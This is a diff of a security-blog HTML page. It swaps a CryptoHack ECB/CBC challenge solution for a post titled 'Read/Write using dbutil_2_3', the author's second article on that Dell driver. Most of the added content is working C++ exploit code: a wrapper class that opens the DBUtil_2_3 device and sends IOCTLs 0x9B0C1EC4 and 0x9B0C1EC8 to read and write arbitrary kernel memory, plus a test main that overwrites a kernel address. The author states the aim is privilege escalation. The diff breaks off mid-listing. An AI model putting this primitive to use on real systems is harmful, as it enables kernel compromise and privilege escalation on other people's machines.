@@ -36,7 +36,7 @@
 
     <title>
         
-            02-ecbcbcwtf |
+            Read/Write using dbutil_2_3 |
             SecurityBlog
         
     </title>
@@ -198,7 +198,7 @@
 
     <div class="header_middle">
         
-            02-ecbcbcwtf -
+            Read/Write using dbutil_2_3 -
             SecurityBlog
         
     </div>
@@ -225,7 +225,7 @@
             
                 <li
                     
-                        class="dir opened-dir"
+                        class="dir closed-dir"
                     >
                     <span class="dir-text"> Cryptohack </span>
 
@@ -527,7 +527,7 @@
             
                 <li
                     
-                        class="dir opened-dir"
+                        class="dir closed-dir"
                     >
                     <span class="dir-text"> symmetric </span>
 
@@ -720,7 +720,7 @@
             
                 <li
                     
-                        class="dir closed-dir"
+                        class="dir opened-dir"
                     >
                     <span class="dir-text"> Windows </span>
 
@@ -741,7 +741,7 @@
             
                 <li
                     
-                        class="dir closed-dir"
+                        class="dir opened-dir"
                     >
                     <span class="dir-text"> Kernel </span>
 
@@ -849,7 +849,7 @@
 
         <div class="title">
             <h1 class="title-header">
-                02-ecbcbcwtf
+                Read/Write using dbutil_2_3
             </h1>
 
             <div class="author-date-readtime">
@@ -872,8 +872,8 @@
                     <div class="date" title="Date">
                         <i class="bi bi-calendar3"></i>
                         <time
-                            datetime="2024.04.26"
-                            >2024.04.26
+                            datetime="2024.08.07"
+                            >2024.08.07
                         </time>
                     </div>
                 
@@ -883,7 +883,7 @@
                         class="readtime"
                         title="Time to Read">
                         <i class="bi bi-clock"></i>
-                        1 min to read
+                        3 mins to read
                     </div>
                 
             </div>
@@ -922,26 +922,11 @@
 
 
 
-<a href="http://localhost:1313/cryptohack/" class="bread-btn">
+<a href="http://localhost:1313/windows/" class="bread-btn">
     
 
     
-        Cryptohack
-    
-</a>
-
-
-
-
-    /
-
-
-
-<a href="http://localhost:1313/cryptohack/symmetric/" class="bread-btn">
-    
-
-    
-        symmetric
+        Windows
     
 </a>
 
@@ -952,12 +937,27 @@
 
 
 
-<a href="http://localhost:1313/cryptohack/symmetric/02-ecbcbcwtf/" class="bread-btn">
+<a href="http://localhost:1313/windows/kernel/" class="bread-btn">
+    
+
+    
+        Kernel
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/windows/kernel/readwrite_using_dbutil_2_3/" class="bread-btn">
     
 
     
         
-            02-ecbcbcwtf
+            Read/Write using dbutil_2_3
         
 
     
@@ -970,67 +970,22 @@
         </div>
 
         
-            <nav id="TableOfContents"></nav>
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#architecture">Architecture</a></li>
+    <li><a href="#constructor">Constructor</a></li>
+    <li><a href="#read-ioctl">Read IOCTL</a></li>
+  </ul>
+</nav>
         
 
 
         <div class="content">
             
-                <h1 id="challenge">Challenge</h1>
-<p>This is another easy challenge we get the encrypted flag in CBC (+ its random IV) mode, but we can decrypt only in ECB mode</p>
-
-
-
-
-
-
-
-<div class="codeblock">
-    
-        <div class="copy-button-box">
-            <button class="copy-button" state="copy" data="from%20Crypto.Cipher%20import%20AES%0d%0a%0d%0a%0d%0aKEY%20=%20?%0d%0aFLAG%20=%20?%0d%0a%0d%0a%0d%0a@chal.route%28%27/ecbcbcwtf/decrypt/%3cciphertext%3e/%27%29%0d%0adef%20decrypt%28ciphertext%29:%0d%0a%20%20%20%20ciphertext%20=%20bytes.fromhex%28ciphertext%29%0d%0a%0d%0a%20%20%20%20cipher%20=%20AES.new%28KEY,%20AES.MODE_ECB%29%0d%0a%20%20%20%20try:%0d%0a%20%20%20%20%20%20%20%20decrypted%20=%20cipher.decrypt%28ciphertext%29%0d%0a%20%20%20%20except%20ValueError%20as%20e:%0d%0a%20%20%20%20%20%20%20%20return%20%7b%22error%22:%20str%28e%29%7d%0d%0a%0d%0a%20%20%20%20return%20%7b%22plaintext%22:%20decrypted.hex%28%29%7d%0d%0a%0d%0a%0d%0a@chal.route%28%27/ecbcbcwtf/encrypt_flag/%27%29%0d%0adef%20encrypt_flag%28%29:%0d%0a%20%20%20%20iv%20=%20os.urandom%2816%29%0d%0a%0d%0a%20%20%20%20cipher%20=%20AES.new%28KEY,%20AES.MODE_CBC,%20iv%29%0d%0a%20%20%20%20encrypted%20=%20cipher.encrypt%28FLAG.encode%28%29%29%0d%0a%20%20%20%20ciphertext%20=%20iv.hex%28%29%20&#43;%20encrypted.hex%28%29%0d%0a%0d%0a%20%20%20%20return%20%7b%22ciphertext%22:%20ciphertext%7d">
-                <i class="bi bi-copy"></i>
-            </button>
-        </div>
-    
-
-    
-        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>KEY <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">?</span>
-</span></span><span style="display:flex;"><span>FLAG <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">?</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@chal.route</span>(<span style="color:#e6db74">&#39;/ecbcbcwtf/decrypt/&lt;ciphertext&gt;/&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(ciphertext):
-</span></span><span style="display:flex;"><span>    ciphertext <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(ciphertext)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(KEY, AES<span style="color:#f92672">.</span>MODE_ECB)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>        decrypted <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(ciphertext)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">ValueError</span> <span style="color:#66d9ef">as</span> e:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;error&#34;</span>: str(e)}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;plaintext&#34;</span>: decrypted<span style="color:#f92672">.</span>hex()}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@chal.route</span>(<span style="color:#e6db74">&#39;/ecbcbcwtf/encrypt_flag/&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt_flag</span>():
-</span></span><span style="display:flex;"><span>    iv <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(KEY, AES<span style="color:#f92672">.</span>MODE_CBC, iv)
-</span></span><span style="display:flex;"><span>    encrypted <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>encrypt(FLAG<span style="color:#f92672">.</span>encode())
-</span></span><span style="display:flex;"><span>    ciphertext <span style="color:#f92672">=</span> iv<span style="color:#f92672">.</span>hex() <span style="color:#f92672">+</span> encrypted<span style="color:#f92672">.</span>hex()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;ciphertext&#34;</span>: ciphertext}</span></span></code></pre></div>
-    
-</div>
-<p><img src="/cryptohack/symmetric/images/CBC_encryption.svg" alt="CBC Encryption"></p>
-<p><img src="/cryptohack/symmetric/images/ECB_encryption.svg" alt="ECB Encryption"></p>
-<h1 id="solution">Solution</h1>
-<p>As we can see in the drawing above, the difference between CBC and ECB is that CBC uses IV.
-We can decrypt with ECB mode the encrypted flag, and then using the IV we received earlier to xor it and retreive the decrypted flag.</p>
+                <p>This article is the second article about dbutil_2_3.sys, in this one I will exploit the vulnerabilities in this driver to gain priviledges in the computer
+We will use the following IOCTLs which allow us to read and write memory to any location in the kernel.</p>
+<h2 id="architecture">Architecture</h2>
+<p>I will first create a class called <code>DBUtilInterface</code> which will have the functionality we need for the driver.</p>
 
 
 
@@ -1048,37 +1003,300 @@ We can decrypt with ECB mode the encrypted flag, and then using the IV we receiv
     
 
     
-        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DBUtilInterface</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>	HANDLE device_handle;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>SITE_FLAG <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://aes.cryptohack.org/ecbcbcwtf/encrypt_flag&#34;</span>
-</span></span><span style="display:flex;"><span>SITE_DECRYPT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://aes.cryptohack.org/ecbcbcwtf/decrypt&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>	DBUtilInterface();
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(SITE_FLAG)<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#34;ciphertext&#34;</span>]
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">~</span>DBUtilInterface();
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>ENC_FLAG <span style="color:#f92672">=</span> cipher[<span style="color:#ae81ff">32</span>:]
-</span></span><span style="display:flex;"><span>IV <span style="color:#f92672">=</span> cipher[:<span style="color:#ae81ff">32</span>]
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>ENC_FLAG <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(ENC_FLAG)
-</span></span><span style="display:flex;"><span>IV <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(IV)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>ecb_dec_flag <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>SITE_DECRYPT<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>ENC_FLAG<span style="color:#f92672">.</span>hex()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#34;plaintext&#34;</span>]
-</span></span><span style="display:flex;"><span>ecb_dec_flag <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(ecb_dec_flag)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>dec_flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(IV)):
-</span></span><span style="display:flex;"><span>    dec_flag <span style="color:#f92672">+=</span> chr(IV[i] <span style="color:#f92672">^</span> ecb_dec_flag[i])
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(IV)):
-</span></span><span style="display:flex;"><span>    dec_flag <span style="color:#f92672">+=</span> chr(ENC_FLAG[i] <span style="color:#f92672">^</span> ecb_dec_flag[len(IV) <span style="color:#f92672">+</span> i])
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>print(dec_flag)</span></span></code></pre></div>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">read_kernel_memory</span>(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> dst, <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> src, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">write_kernel_memory</span>(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> dst, <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> src, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size);
+</span></span><span style="display:flex;"><span>};</span></span></code></pre></div>
     
 </div>
-<p><a href="/cryptohack/symmetric/code/ecbcbcwtf.py">ecbcbcwtf.py</a></p>
+<h2 id="constructor">Constructor</h2>
+<p>We want that in the constructor of the class a new handle to the device driver will be open</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#define%20DBUTIL_DEVICE_NAME%20L%22%5c%5c%5c%5c.%5c%5cDBUtil_2_3%22%20">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#define DBUTIL_DEVICE_NAME L&#34;\\\\.\\DBUtil_2_3&#34; </span></span></span></code></pre></div>
+    
+</div>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>DBUtilInterface<span style="color:#f92672">::</span>DBUtilInterface()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>device_handle <span style="color:#f92672">=</span> CreateFileW(DBUTIL_DEVICE_NAME,
+</span></span><span style="display:flex;"><span>		GENERIC_WRITE <span style="color:#f92672">|</span> GENERIC_READ,
+</span></span><span style="display:flex;"><span>		FILE_SHARE_WRITE,
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">nullptr</span>,
+</span></span><span style="display:flex;"><span>		OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">nullptr</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+    
+</div>
+<p>And that in the destructor of the class the handle will close</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>DBUtilInterface<span style="color:#f92672">::~</span>DBUtilInterface()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>device_handle <span style="color:#f92672">!=</span> INVALID_HANDLE_VALUE)
+</span></span><span style="display:flex;"><span>		CloseHandle(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>device_handle);
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+    
+</div>
+<h2 id="read-ioctl">Read IOCTL</h2>
+<p>Now we will create the function that will interact with IOCTL 0x9B0C1EC4 which allows us to read any address in the kernel.</p>
+<p>As shown in the other article the struct the driver the IOCTL expects a struct containing 3 void* and after that an empty buffer of any size that will get the output data.</p>
+<p>The pack attributes telling the compiler to not add padding between variables</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#pragma%20pack%28push,%201%29%0d%0atypedef%20struct%20%7b%0d%0a%09void*%20unknown_address;%0d%0a%09void*%20src_address1;%0d%0a%09void*%20src_address2;%0d%0a%09char%20data[];%0d%0a%7d%20ioctl_9B0C1EC4_struct;%0d%0a#pragma%20pack%28pop%29">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#pragma pack(push, 1)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> unknown_address;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> src_address1;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> src_address2;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> data[];
+</span></span><span style="display:flex;"><span>} ioctl_9B0C1EC4_struct;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma pack(pop)</span></span></span></code></pre></div>
+    
+</div>
+<p>Now we can write the function that creates this struct, fill it up with the addresses, sends it to the device driver and read from it.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> DBUtilInterface<span style="color:#f92672">::</span>read_kernel_memory(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> dst, <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> src, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	DWORD _;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> total_struct_size <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(dbutil_ioctl_read_write_struct) <span style="color:#f92672">+</span> size;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	dbutil_ioctl_read_write_struct<span style="color:#f92672">*</span> ioctl_struct <span style="color:#f92672">=</span> <span style="color:#66d9ef">reinterpret_cast</span><span style="color:#f92672">&lt;</span>dbutil_ioctl_read_write_struct<span style="color:#f92672">*&gt;</span>(HeapAlloc(GetProcessHeap(),
+</span></span><span style="display:flex;"><span>		HEAP_ZERO_MEMORY,
+</span></span><span style="display:flex;"><span>		total_struct_size));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ioctl_struct)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	ioctl_struct<span style="color:#f92672">-&gt;</span>unknown_address <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	ioctl_struct<span style="color:#f92672">-&gt;</span>src_address1 <span style="color:#f92672">=</span> src;
+</span></span><span style="display:flex;"><span>	ioctl_struct<span style="color:#f92672">-&gt;</span>src_address2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">bool</span> succeed <span style="color:#f92672">=</span> DeviceIoControl(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>device_handle,
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x9B0C1EC4</span>,
+</span></span><span style="display:flex;"><span>		ioctl_struct,
+</span></span><span style="display:flex;"><span>		total_struct_size,
+</span></span><span style="display:flex;"><span>		ioctl_struct,
+</span></span><span style="display:flex;"><span>		total_struct_size,
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&amp;</span>_,
+</span></span><span style="display:flex;"><span>		NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (succeed)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> (size_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> size; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">reinterpret_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">*&gt;</span>(dst)[i] <span style="color:#f92672">=</span> ioctl_struct<span style="color:#f92672">-&gt;</span>data[i];
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	HeapFree(GetProcessHeap(), NULL, ioctl_struct);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> succeed;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+    
+</div>
+<p>We can write the other function the same way because it uses the same structs</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> DBUtilInterface<span style="color:#f92672">::</span>write_kernel_memory(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> dst, <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> src, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	DWORD _;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> total_struct_size <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(dbutil_ioctl_read_write_struct) <span style="color:#f92672">+</span> size;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	dbutil_ioctl_read_write_struct<span style="color:#f92672">*</span> ioctl_struct <span style="color:#f92672">=</span> <span style="color:#66d9ef">reinterpret_cast</span><span style="color:#f92672">&lt;</span>dbutil_ioctl_read_write_struct<span style="color:#f92672">*&gt;</span>(HeapAlloc(GetProcessHeap(),
+</span></span><span style="display:flex;"><span>		HEAP_ZERO_MEMORY,
+</span></span><span style="display:flex;"><span>		total_struct_size));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ioctl_struct)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	ioctl_struct<span style="color:#f92672">-&gt;</span>unknown_address <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	ioctl_struct<span style="color:#f92672">-&gt;</span>src_address1 <span style="color:#f92672">=</span> dst;
+</span></span><span style="display:flex;"><span>	ioctl_struct<span style="color:#f92672">-&gt;</span>src_address2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (size_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> size; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		ioctl_struct<span style="color:#f92672">-&gt;</span>data[i] <span style="color:#f92672">=</span> <span style="color:#66d9ef">reinterpret_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">*&gt;</span>(src)[i];
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">bool</span> succeed <span style="color:#f92672">=</span> DeviceIoControl(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>device_handle,
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x9B0C1EC8</span>,
+</span></span><span style="display:flex;"><span>		ioctl_struct,
+</span></span><span style="display:flex;"><span>		total_struct_size,
+</span></span><span style="display:flex;"><span>		ioctl_struct,
+</span></span><span style="display:flex;"><span>		total_struct_size,
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&amp;</span>_,
+</span></span><span style="display:flex;"><span>		NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	HeapFree(GetProcessHeap(), NULL, ioctl_struct);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> succeed;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+    
+</div>
+<p>Now let&rsquo;s check those function that everything is running correctly using the main function</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#include%20%3cstdio.h%3e%0d%0a#include%20%22exploit_dbutil_2_3.h%22%0d%0a%0d%0a%0d%0avoid%20print_bytes%28void*%20bytes,%20unsigned%20int%20size%29%0d%0a%7b%0d%0a%09for%20%28size_t%20i%20=%200;%20i%20%3c%20size;%20i&#43;&#43;%29%0d%0a%09%7b%0d%0a%09%09printf%28%220x%02X%20%22,%20reinterpret_cast%3cunsigned%20char*%3e%28bytes%29[i]%29;%0d%0a%09%7d%0d%0a%7d%0d%0a%0d%0aint%20main%28int%20argc,%20char*%20argv[]%29%0d%0a%7b%0d%0a%09printf%28%22Creating%20handle%20to%20the%20device%20driver%20dbutil_2_3.sys%5cn%22%29;%0d%0a%09DBUtilInterface%20dbutil_interface;%0d%0a%09%0d%0a%09printf%28%22handle%20%25x%5cn%22,%20dbutil_interface.device_handle%29;%0d%0a%09%0d%0a%09void*%20src;%0d%0a%09scanf_s%28%22%25llx%5cn%22,%20&amp;src%29;%0d%0a%0d%0a%09printf%28%22%25llx%5cn%22,%20src%29;%0d%0a%0d%0a%09unsigned%20char%20dst[8];%0d%0a%0d%0a%09dbutil_interface.read_kernel_memory%28dst,%20src,%208%29;%0d%0a%09print_bytes%28dst,%208%29;%0d%0a%0d%0a%09dbutil_interface.write_kernel_memory%28src,%20%28void*%29%22hello%5cx00%5cx00%5cx00%22,%208%29;%0d%0a%0d%0a%09dbutil_interface.read_kernel_memory%28dst,%20src,%208%29;%0d%0a%09print_bytes%28dst,%208%29;%0d%0a%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;exploit_dbutil_2_3.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">print_bytes</span>(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> bytes, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (size_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> size; i<span style="color:#f92672">++</span>)
